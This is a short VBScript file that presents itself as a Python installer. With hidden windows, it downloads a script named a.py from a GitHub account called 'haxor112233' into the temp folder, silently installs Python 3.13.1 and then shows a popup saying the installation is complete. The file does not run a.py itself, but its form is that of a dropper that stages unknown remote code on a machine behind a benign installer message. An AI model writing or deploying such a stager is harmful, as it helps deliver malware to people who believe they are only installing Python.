Set objShell = CreateObject("WScript.Shell")

' Run the first curl command to download a.py
objShell.Run "cmd /c curl -s -o ""%TEMP%\a.py"" ""https://raw.githubusercontent.com/haxor112233/file/refs/heads/main/a.py""", 0, True

' Run the second curl command to download the Python installer
objShell.Run "cmd /c curl -s -o ""%TEMP%\python-3.13.1-amd64.exe"" ""https://www.python.org/ftp/python/3.13.1/python-3.13.1-amd64.exe""", 0, True

' Run the Python installer with silent options (waits until it completes)
objShell.Run """%TEMP%\python-3.13.1-amd64.exe"" /quiet InstallAllUsers=0 PrependPath=1 Include_pip=1", 0, True

' Show a popup message immediately after installation completes
objShell.Popup "Python installation is complete!", 5, "Installation Finished", 64
